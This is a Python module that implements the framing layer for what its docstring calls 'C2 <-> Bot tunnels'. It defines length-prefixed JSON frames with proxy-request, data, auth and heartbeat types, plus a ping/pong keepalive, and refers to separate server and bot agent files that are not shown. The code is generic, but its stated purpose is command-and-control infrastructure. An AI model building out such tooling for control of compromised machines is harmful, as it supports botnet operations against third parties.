#!/usr/bin/env python3
"""
protocol.py

Async framed protocol for C2 <-> Bot tunnels.

Features:
- JSON frames with a 4-byte big-endian length prefix
- Binary payload encoded as base64
- Heartbeat (PING/PONG)
- Basic authentication support via an AUTH frame

Frame schema (JSON):
{
  "type": "PROXY_REQUEST|DATA|END|OK|ERR|PING|PONG|AUTH",
  "request_id": "string-uuid-or-id",  # required for proxied traffic, optional for control frames
  "payload": "base64-string",         # raw bytes encoded as base64 (optional depending on type)
  "meta": { ... }                      # optional fields (e.g., host, port, token, reason)
}

Notes:
- Length prefix includes only the JSON payload (bytes), not the 4-byte header
- This module is deliberately TLS-agnostic; SSL contexts are set in c2_server.py / bot_agent.py
"""

import asyncio
import base64
import contextlib
import json
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, Optional


logger = logging.getLogger("protocol")


def b64encode_bytes(data: bytes) -> str:
    if not data:
        return ""
    return base64.b64encode(data).decode("ascii")


def b64decode_str(data: Optional[str]) -> bytes:
    if not data:
        return b""
    return base64.b64decode(data)


@dataclass
class Frame:
    type: str
    request_id: Optional[str] = None
    payload: Optional[bytes] = None
    meta: Dict[str, Any] = field(default_factory=dict)

    def to_bytes(self) -> bytes:
        obj: Dict[str, Any] = {"type": self.type}
        if self.request_id is not None:
            obj["request_id"] = self.request_id
        if self.payload is not None:
            obj["payload"] = b64encode_bytes(self.payload)
        if self.meta:
            obj["meta"] = self.meta
        raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
        length = len(raw).to_bytes(4, byteorder="big")
        return length + raw

    @staticmethod
    def from_bytes(buf: bytes) -> "Frame":
        obj = json.loads(buf.decode("utf-8"))
        payload_b = b64decode_str(obj.get("payload"))
        return Frame(
            type=obj["type"],
            request_id=obj.get("request_id"),
            payload=payload_b if payload_b else None,
            meta=obj.get("meta", {})
        )


class FramedStream:
    """Length-prefixed JSON frames over asyncio streams."""

    def __init__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        self.reader = reader
        self.writer = writer
        self._lock = asyncio.Lock()

    async def send(self, frame: Frame) -> None:
        data = frame.to_bytes()
        async with self._lock:
            self.writer.write(data)
            await self.writer.drain()

    async def recv(self, timeout: Optional[float] = None) -> Optional[Frame]:
        try:
            if timeout is None:
                header = await self.reader.readexactly(4)
            else:
                header = await asyncio.wait_for(self.reader.readexactly(4), timeout)
            length = int.from_bytes(header, byteorder="big")
            body = await self.reader.readexactly(length)
            return Frame.from_bytes(body)
        except (asyncio.IncompleteReadError, asyncio.TimeoutError):
            return None

    def close(self) -> None:
        try:
            self.writer.close()
        except Exception:
            pass


class Heartbeat:
    """Heartbeat helper running PING/PONG on a FramedStream."""

    def __init__(self, stream: FramedStream, interval: float = 15.0, timeout: float = 45.0, name: str = ""):
        self.stream = stream
        self.interval = interval
        self.timeout = timeout
        self.name = name or "hb"
        self._last_pong = time.monotonic()
        self._task: Optional[asyncio.Task] = None
        self._rx_task: Optional[asyncio.Task] = None
        self._running = False

    async def start(self) -> None:
        self._running = True
        self._task = asyncio.create_task(self._run(), name=f"hb-sender-{self.name}")

    async def _run(self) -> None:
        try:
            while self._running:
                await asyncio.sleep(self.interval)
                try:
                    await self.stream.send(Frame(type="PING"))
                except Exception as e:
                    logger.warning("%s: failed to send PING: %s", self.name, e)
                    break
                # timeout check
                if (time.monotonic() - self._last_pong) > self.timeout:
                    logger.warning("%s: heartbeat timeout", self.name)
                    break
        finally:
            self._running = False
            try:
                self.stream.close()
            except Exception:
                pass

    async def handle_rx(self, frame: Frame) -> bool:
        """Return True if heartbeat handled the frame."""
        if frame.type == "PING":
            await self.stream.send(Frame(type="PONG"))
            return True
        if frame.type == "PONG":
            self._last_pong = time.monotonic()
            return True
        return False

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()
            with contextlib.suppress(Exception):
                await self._task


